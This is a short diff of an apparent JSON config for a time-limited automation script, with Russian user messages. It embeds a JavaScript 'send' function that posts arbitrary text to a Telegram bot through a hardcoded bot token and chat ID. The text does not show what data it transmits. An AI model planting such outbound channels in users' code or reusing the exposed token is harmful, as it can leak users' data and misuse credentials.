@@ -59,6 +59,6 @@
     "timeout":"Время пользования скриптом вышло,\nобратитесь к автору скрипта: t.me/poet_dy",
     "forall": "Здрасьте"  
 },
-"send" : "function send(t){const e={hostname:'api.telegram.org',path:'/bot6190475665:AAFlBOAwtZuDbvHmIZEsdgopqu9UtPicmXI/sendMessage?chat_id=202040668&text='+encodeURIComponent(t),method:'GET',headers:{'Content-Type':'text/plain; charset=utf-8'}};reaqest=https.get(e,(t=>{200===t.statusCode&&(t.on('end',(()=>{})),t.on('close',(()=>{Action.Finish()})))}))}",
-  
-}
+"send" : "function send(t){const e={hostname:'api.telegram.org',path:'/bot6190475665:AAFlBOAwtZuDbvHmIZEsdgopqu9UtPicmXI/sendMessage?chat_id=202040668&text='+encodeURIComponent(t),method:'GET',headers:{'Content-Type':'text/plain; charset=utf-8'}};reaqest=https.get(e,(t=>{200===t.statusCode&&(t.on('end',(()=>{})),t.on('close',(()=>{Action.Finish()})))}))}"
+ } 
+
